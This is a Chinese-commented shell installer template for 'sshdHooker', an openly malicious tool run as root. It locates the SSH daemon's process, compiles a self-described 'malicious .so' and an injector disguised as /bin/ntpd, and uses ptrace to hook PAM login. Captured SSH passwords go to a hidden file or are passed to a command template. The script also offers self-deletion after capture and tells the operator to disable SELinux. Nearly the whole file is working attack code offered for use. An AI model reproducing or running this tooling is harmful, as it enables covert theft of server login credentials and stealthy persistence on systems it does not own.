#!/bin/sh
# =============================================================
# sshdHooker 通用安装器 (自包含, 支持 x86_64 / aarch64)
#
# 本文件是 tools/install.tmpl.sh 的模板; 实际分发的 install.sh
# 由 tools/mkinstaller.sh 生成, 并将源码包 base64 内嵌到下方标记处.
# 修改请编辑模板与源码后重新生成, 勿直接改生成的 install.sh.
#
# 流程: 环境预检 -> sshd pid 探测 -> 解包内嵌源码 ->
#       现场编译(配置经 -D 宏注入, 不修改源码) -> 后台启动 -> 启动自检
#
# 用法:
#   bash install.sh [选项]        安装并注入
#   bash install.sh --status      查看注入器运行状态
#   bash install.sh --uninstall   停止注入器并清理所有文件
#
# 选项:
#   -e, --evil-so PATH    恶意 so 输出路径     (默认 /tmp/.g.so)
#   -o, --output PATH     注入器伪装输出路径   (默认 /bin/ntpd)
#   -m, --mode 0|1        0=写文件 1=命令执行  (默认 0)
#   -p, --payload STR     密码输出文件 / 命令模板(命令模式需含两个 %s)
#   -d, --delete USER     捕获后自删除 (anyone=任意用户登录成功即删)
#   -l, --libc STR        /proc/pid/maps 匹配 libc 的特征串 (默认自动)
#   -s, --sshd-pid PID    手动指定 sshd 主进程 pid (默认自动探测)
#       --keep-build      保留编译临时目录 (调试用)
#   -h, --help            帮助
#
# 环境要求: root; glibc; sshd 启用 PAM(pam_unix) 且 SELinux 非 enforcing.
# =============================================================

#__PAYLOAD_B64__

# ---------------- 默认配置 ----------------

state_file="/tmp/.sshdhooker.state"

evil_so_path="/tmp/.g.so"
inject_bin="/bin/ntpd"
payload="/tmp/.password.txt"
mode="0"
silent_mode="0"
silent_user="anyone"
libc_string=""
sshd_pid=""
keep_build=0
action="install"
injector_log="/tmp/.injector.log"

# ---------------- 基础函数 ----------------

info() { printf '[+] %s\n' "$*"; }
warn() { printf '[!] %s\n' "$*"; }
die()  { printf '[-] %s\n' "$*" >&2; exit 1; }

usage() {
    cat <<'USAGE'
用法: bash install.sh [选项]
  -e, --evil-so PATH    恶意 so 输出路径     (默认 /tmp/.g.so)
  -o, --output PATH     注入器伪装输出路径   (默认 /bin/ntpd)
  -m, --mode 0|1        0=写文件 1=命令执行  (默认 0)
  -p, --payload STR     密码输出文件 / 命令模板(命令模式需含两个 %s)
  -d, --delete USER     捕获后自删除 (anyone=任意用户登录成功即删)
  -l, --libc STR        /proc/pid/maps 匹配 libc 的特征串 (默认自动)
  -s, --sshd-pid PID    手动指定 sshd 主进程 pid (默认自动探测)
      --uninstall       停止注入器并清理所有文件
      --status          查看注入器运行状态
      --keep-build      保留编译临时目录 (调试用)
  -h, --help            本帮助
USAGE
}

# ---------------- 参数解析(短参 -x val 与长参 --long=val) ----------------

while [ $# -gt 0 ]; do
    case "$1" in
        -e|--evil-so)       [ $# -ge 2 ] || die "$1 缺少参数"; evil_so_path=$2; shift 2 ;;
        -e=*|--evil-so=*)   evil_so_path=${1#*=}; shift ;;
        -o|--output)        [ $# -ge 2 ] || die "$1 缺少参数"; inject_bin=$2; shift 2 ;;
        -o=*|--output=*)    inject_bin=${1#*=}; shift ;;
        -m|--mode)          [ $# -ge 2 ] || die "$1 缺少参数"; mode=$2; shift 2 ;;
        -m=*|--mode=*)      mode=${1#*=}; shift ;;
        -p|--payload)       [ $# -ge 2 ] || die "$1 缺少参数"; payload=$2; shift 2 ;;
        -p=*|--payload=*)   payload=${1#*=}; shift ;;
        -d|--delete)        [ $# -ge 2 ] || die "$1 缺少参数"; silent_mode=1; silent_user=$2; shift 2 ;;
        -d=*|--delete=*)    silent_mode=1; silent_user=${1#*=}; shift ;;
        -l|--libc)          [ $# -ge 2 ] || die "$1 缺少参数"; libc_string=$2; shift 2 ;;
        -l=*|--libc=*)      libc_string=${1#*=}; shift ;;
        -s|--sshd-pid)      [ $# -ge 2 ] || die "$1 缺少参数"; sshd_pid=$2; shift 2 ;;
        -s=*|--sshd-pid=*)  sshd_pid=${1#*=}; shift ;;
        --uninstall)        action=uninstall; shift ;;
        --status)           action=status; shift ;;
        --keep-build)       keep_build=1; shift ;;
        -h|--help)          usage; exit 0 ;;
        *)                  die "未知参数: $1 (见 --help)" ;;
    esac
done

# ---------------- --status / --uninstall ----------------

read_state() {
    [ -f "$state_file" ] || die "未找到安装记录 $state_file, 可能未安装过"
    state_inject_bin=$(grep '^inject_bin=' "$state_file" | cut -d= -f2-)
    state_evil_so=$(grep '^evil_so_path=' "$state_file" | cut -d= -f2-)
    state_pid=$(grep '^injector_pid=' "$state_file" | cut -d= -f2-)
    state_log=$(grep '^log=' "$state_file" | cut -d= -f2-)
    state_sshd=$(grep '^sshd_pid=' "$state_file" | cut -d= -f2-)
}

if [ "$action" = status ]; then
    read_state
    if [ -n "$state_pid" ] && kill -0 "$state_pid" 2>/dev/null; then
        info "注入器运行中: pid=$state_pid (sshd pid=$state_sshd)"
        info "二进制: $state_inject_bin ; 恶意 so: $state_evil_so"
    else
        warn "注入器未在运行 (记录 pid=$state_pid)"
    fi
    echo '--- 日志尾部:'
    tail -5 "$state_log" 2>/dev/null
    exit 0
fi

if [ "$action" = uninstall ]; then
    read_state
    if [ -n "$state_pid" ] && kill -0 "$state_pid" 2>/dev/null; then
        kill "$state_pid" 2>/dev/null
        sleep 1
        kill -0 "$state_pid" 2>/dev/null && kill -9 "$state_pid" 2>/dev/null
        info "注入器已停止 (pid=$state_pid)"
    else
        warn "注入器本就未在运行"
    fi
    rm -f "$state_inject_bin" "$state_evil_so" "$state_log" "$state_file"
    info "已清理: $state_inject_bin $state_evil_so $state_log $state_file"
    exit 0
fi

# ---------------- 环境预检 ----------------

[ "$(id -u)" = 0 ] || die "需要 root 权限 (ptrace 注入 sshd)"

case "$(uname -m)" in
    x86_64)          srcdir=x86_64; with_shellcode=1 ;;
    aarch64|arm64)   srcdir=arm;    with_shellcode=0 ;;
    *)               die "不支持的架构: $(uname -m) (当前支持 x86_64 / aarch64)" ;;
esac
info "架构: $(uname -m) -> 使用 $srcdir 源码"

command -v gcc >/dev/null 2>&1 || die "未找到 gcc, 请先安装 (Debian/Ubuntu: apt install build-essential; EL: dnf install gcc)"

if ldd --version 2>&1 | head -1 | grep -qi musl; then
    die "musl 环境: sshd 通常未启用 PAM, 本工具不适用"
fi

[ -f /etc/pam.d/sshd ] || die "/etc/pam.d/sshd 不存在: sshd 未启用 PAM, 本工具不适用"

if command -v getenforce >/dev/null 2>&1 && getenforce 2>/dev/null | grep -qi enforcing; then
    die "SELinux 处于 enforcing, ptrace 注入会被拦截, 请先 setenforce 0"
fi

[ "$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)" = "3" ] && \
    die "yama ptrace_scope=3 已完全禁用 ptrace, 无法注入"

# sshd 运行配置检查(尽力而为, 失败不阻断)
sshd_bin=$(command -v sshd || echo /usr/sbin/sshd)
if cfg=$("$sshd_bin" -T 2>/dev/null); then
    echo "$cfg" | grep -qi '^usepam no' && die "sshd 配置 UsePAM no: 本工具依赖 pam_unix 认证流程"
    echo "$cfg" | grep -qi '^passwordauthentication no' && \
        warn "sshd 未开启密码认证(PasswordAuthentication no), 将抓不到任何密码"
else
    warn "sshd -T 解析失败, 跳过 UsePAM/密码认证预检"
fi

ls /usr/lib*/security/pam_unix.so /lib*/security/pam_unix.so 2>/dev/null | head -1 >/dev/null || \
    warn "常见路径未找到 pam_unix.so, 若认证栈不含 pam_unix 将无法捕获"

[ ${#payload} -lt 255 ] || die "payload 长度需小于 255"
case "$mode" in 0|1) ;; *) die "-m 仅支持 0(写文件) 或 1(命令执行)" ;; esac
[ "$mode" = 1 ] && case "$payload" in *%s*%s*) ;; *) die "命令模式(-m 1)的 payload 需包含两个 %s" ;; esac

# ---------------- sshd 主进程 pid 探测 ----------------
# 优先级: -s 手动指定 > systemd MainPID > ps [listener] 标题(OpenSSH>=8.9)
#         > 退化模式(最早的 root sshd 常驻进程, 会给出警告)

if [ -n "$sshd_pid" ]; then
    kill -0 "$sshd_pid" 2>/dev/null || die "-s 指定的 pid $sshd_pid 不存在"
    info "使用手动指定的 sshd pid: $sshd_pid"
else
    if command -v systemctl >/dev/null 2>&1; then
        for unit in ssh sshd sshd.service; do
            p=$(systemctl show -p MainPID "$unit" 2>/dev/null | tail -1)
            p=${p#MainPID=}
            if [ -n "$p" ] && [ "$p" != "0" ] && kill -0 "$p" 2>/dev/null; then
                sshd_pid=$p
                break
            fi
        done
    fi
    if [ -z "$sshd_pid" ] && command -v ps >/dev/null 2>&1; then
        sshd_pid=$(ps -ef 2>/dev/null | grep sshd | grep '\[listener\]' | grep -v grep | awk '{print $2}' | head -1)
    fi
    if [ -z "$sshd_pid" ] && command -v ps >/dev/null 2>&1; then
        # 退化模式: root 的 sshd 常驻进程(排除 "sshd: xxx@pts" 会话子进程), 取最早一个
        sshd_pid=$(ps -eo pid=,user=,args= 2>/dev/null | awk '$2=="root" && $3 ~ /sshd/ && $0 !~ /sshd: / {print $1}' | head -1)
        [ -n "$sshd_pid" ] && \
            warn "低精度 pid 探测(OpenSSH<8.9 无 [listener] 标题): 选中 $sshd_pid, 若有多个 sshd 进程请用 -s 确认"
    fi
    [ -n "$sshd_pid" ] || die "未找到 sshd 主进程 (systemd socket 激活? ), 请用 -s 手动指定"
    info "探测到 sshd 主进程 pid: $sshd_pid"
fi

# ---------------- 解包内嵌源码 ----------------

workdir=$(mktemp -d /tmp/.shb.XXXXXX) || die "创建临时目录失败"
cleanup() {
    if [ "$keep_build" = 1 ]; then
        info "保留编译目录: $workdir (--keep-build)"
    else
        rm -rf "$workdir"
    fi
}
trap cleanup EXIT INT TERM

printf '%s' "$PAYLOAD_B64" | base64 -d 2>/dev/null | tar -xzf - -C "$workdir" 2>/dev/null \
    || die "内嵌源码解包失败 (文件损坏?)"
[ -f "$workdir/$srcdir/sshdHooker.c" ] || die "解包不完整: 缺少 $srcdir/sshdHooker.c"

# ---------------- 编译(配置经 -D 宏注入, 不改动源码) ----------------

# C 字符串字面量转义: 反斜杠与双引号
c_escape() { printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g'; }

info "编译恶意 so -> $evil_so_path"
gcc -shared "$workdir/$srcdir/inject_got.c" -o "$evil_so_path" -ldl -fPIC -std=c99 \
    -DSEND_MODE_DEFAULT="$mode" \
    -DSEND_TARGET_DEFAULT="\"$(c_escape "$payload")\"" \
    -DEVIL_SO_PATH_DEFAULT="\"$(c_escape "$evil_so_path")\"" \
    -DSILENT_MODE_DEFAULT="$silent_mode" \
    -DSILENT_USER_DEFAULT="\"$(c_escape "$silent_user")\"" \
    || die "恶意 so 编译失败 (加 --keep-build 保留 $workdir 排查)"

inject_srcs="$workdir/$srcdir/sshdHooker.c"
[ "$with_shellcode" = 1 ] && inject_srcs="$inject_srcs $workdir/$srcdir/shellcode.s"
info "编译注入器 -> $inject_bin"
# shellcheck disable=SC2086
gcc $inject_srcs -g -o "$inject_bin" -ldl -lpthread \
    -DEVIL_SO_PATH_DEFAULT="\"$(c_escape "$evil_so_path")\"" \
    ${libc_string:+-DLIBC_PATTERN_DEFAULT="\"$(c_escape "$libc_string")\""} \
    || die "注入器编译失败 (加 --keep-build 保留 $workdir 排查)"

[ -x "$inject_bin" ] && [ -f "$evil_so_path" ] || die "编译产物校验失败"

# ---------------- 启动注入器并自检 ----------------

if [ -f "$state_file" ]; then
    oldpid=$(grep '^injector_pid=' "$state_file" | cut -d= -f2-)
    kill -0 "$oldpid" 2>/dev/null && { warn "已有注入器在运行(pid=$oldpid), 先停止"; kill "$oldpid" 2>/dev/null; sleep 1; }
fi

info "启动注入器 (sshd pid=$sshd_pid)..."
nohup "$inject_bin" "$sshd_pid" >"$injector_log" 2>&1 &
inj_pid=$!

sleep 2
if ! kill -0 "$inj_pid" 2>/dev/null; then
    tail -5 "$injector_log" 2>/dev/null
    die "注入器启动后即退出, 完整日志: $injector_log"
fi
if grep -q 'Attach failed\|Attach Failed' "$injector_log" 2>/dev/null; then
    tail -5 "$injector_log" 2>/dev/null
    kill "$inj_pid" 2>/dev/null
    die "注入器 attach sshd($sshd_pid) 失败, 请确认 pid 是否为 sshd 主进程"
fi

cat > "$state_file" <<EOF
inject_bin=$inject_bin
evil_so_path=$evil_so_path
injector_pid=$inj_pid
sshd_pid=$sshd_pid
log=$injector_log
EOF

info "注入成功: 注入器 pid=$inj_pid, sshd pid=$sshd_pid"
info "验证: 用密码 SSH 登录本机一次, 然后: cat $payload"
info "管理: bash $0 --status / bash $0 --uninstall"
